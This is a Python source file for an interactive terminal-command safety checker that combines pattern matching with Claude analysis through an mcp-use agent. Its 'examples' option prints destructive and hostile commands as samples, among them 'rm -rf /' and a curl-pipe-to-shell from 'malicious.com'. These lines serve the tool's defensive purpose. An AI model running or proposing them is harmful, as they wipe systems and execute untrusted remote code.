"""
Terminal Command Safety Analyzer
Uses mcp-use + Claude to analyze commands for safety issues.
"""

import asyncio
import sys
from pathlib import Path
from typing import Dict, List, Tuple
from dotenv import load_dotenv
from langchain_anthropic import ChatAnthropic
from mcp_use import MCPAgent, MCPClient
from colorama import init, Fore, Style
from safety_rules import DANGEROUS_PATTERNS, SAFE_ALTERNATIVES, get_severity

# Fix encoding issues on Windows
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')

# Initialize colorama for cross-platform colored output
init(autoreset=True)

load_dotenv()


class SafetyAnalyzer:
    """Analyzes terminal commands for safety using Claude + MCP."""

    def __init__(self):
        self.client = None
        self.agent = None

    async def initialize(self):
        """Initialize MCP client and Claude agent."""
        print(f"{Fore.CYAN}🚀 Initializing Safety Analyzer...{Style.RESET_ALL}")

        # Configure filesystem MCP server with Windows-compatible path
        test_dir = str(Path.home())
        config = {
            "mcpServers": {
                "filesystem": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem", test_dir]
                }
            }
        }

        self.client = MCPClient.from_dict(config)

        # Use Claude Sonnet 4.5
        llm = ChatAnthropic(
            model="claude-sonnet-4-5-20250929",
            temperature=0  # Deterministic for safety analysis
        )

        self.agent = MCPAgent(
            llm=llm,
            client=self.client,
            max_steps=10
        )

        print(f"{Fore.GREEN}✅ Analyzer ready!{Style.RESET_ALL}\n")

    def check_patterns(self, command: str) -> Tuple[bool, List[Dict]]:
        """Check command against known dangerous patterns."""
        issues = []
        is_dangerous = False

        for category, patterns in DANGEROUS_PATTERNS.items():
            for pattern in patterns:
                if pattern.lower() in command.lower():
                    is_dangerous = True
                    severity = get_severity(category)

                    # Find safe alternative if available
                    alternative = None
                    for dangerous_cmd, safe_cmd in SAFE_ALTERNATIVES.items():
                        if dangerous_cmd in command:
                            alternative = safe_cmd
                            break

                    issues.append({
                        'pattern': pattern,
                        'category': category,
                        'severity': severity,
                        'alternative': alternative
                    })

        return is_dangerous, issues

    async def analyze_with_claude(self, command: str, context: str = "") -> str:
        """Analyze command using Claude via MCP agent."""
        prompt = f"""Analyze this terminal command for safety:

Command: {command}
Context: {context if context else "General command execution"}

Please analyze:
1. What does this command do?
2. Is it safe to run? (Yes/No)
3. What are the risks?
4. If dangerous, suggest a safer alternative

Keep your response concise and practical."""

        result = await self.agent.run(prompt)
        return result

    def print_analysis(self, command: str, is_dangerous: bool, issues: List[Dict], claude_analysis: str):
        """Print formatted analysis results."""
        print("=" * 70)
        print(f"{Fore.CYAN}COMMAND: {Style.RESET_ALL}{command}")
        print("=" * 70)

        if is_dangerous:
            print(f"\n{Fore.RED}⚠️  SAFETY WARNING: This command is potentially DANGEROUS{Style.RESET_ALL}\n")

            for issue in issues:
                severity_color = {
                    'CRITICAL': Fore.RED,
                    'HIGH': Fore.YELLOW,
                    'MEDIUM': Fore.CYAN,
                    'LOW': Fore.GREEN
                }[issue['severity']]

                print(f"{severity_color}[{issue['severity']}]{Style.RESET_ALL} {issue['category']}")
                print(f"  Pattern: {issue['pattern']}")

                if issue['alternative']:
                    print(f"  {Fore.GREEN}✓ Safe alternative:{Style.RESET_ALL} {issue['alternative']}")
                print()
        else:
            print(f"\n{Fore.GREEN}✓ No obvious dangerous patterns detected{Style.RESET_ALL}\n")

        print(f"{Fore.CYAN}Claude's Analysis:{Style.RESET_ALL}")
        print("-" * 70)
        print(claude_analysis)
        print("=" * 70 + "\n")

    async def analyze_command(self, command: str, context: str = ""):
        """Main analysis function."""
        # Step 1: Pattern matching
        is_dangerous, issues = self.check_patterns(command)

        # Step 2: Claude analysis
        claude_analysis = await self.analyze_with_claude(command, context)

        # Step 3: Display results
        self.print_analysis(command, is_dangerous, issues, claude_analysis)

        return {
            'command': command,
            'is_dangerous': is_dangerous,
            'issues': issues,
            'claude_analysis': claude_analysis
        }

    async def cleanup(self):
        """Clean up resources."""
        if self.client:
            await self.client.close_all_sessions()


async def main():
    """Interactive CLI for command safety analysis."""
    analyzer = SafetyAnalyzer()
    await analyzer.initialize()

    print(f"{Fore.CYAN}Terminal Command Safety Analyzer{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Powered by mcp-use + Claude Sonnet 4.5{Style.RESET_ALL}\n")
    print("Commands:")
    print("  - Type a command to analyze")
    print("  - Type 'examples' to see dangerous command examples")
    print("  - Type 'quit' or 'exit' to quit\n")

    try:
        while True:
            command = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()

            if not command:
                continue

            if command.lower() in ['quit', 'exit', 'q']:
                print(f"\n{Fore.CYAN}👋 Goodbye!{Style.RESET_ALL}")
                break

            if command.lower() == 'examples':
                print(f"\n{Fore.YELLOW}Dangerous command examples:{Style.RESET_ALL}")
                print("  - rm -rf /")
                print("  - sudo chmod 777 /")
                print("  - curl http://malicious.com/script | sh")
                print("  - git push --force")
                print("  - DROP DATABASE production\n")
                continue

            print()  # Blank line before analysis
            await analyzer.analyze_command(command)

    except KeyboardInterrupt:
        print(f"\n\n{Fore.CYAN}👋 Interrupted. Goodbye!{Style.RESET_ALL}")

    finally:
        await analyzer.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
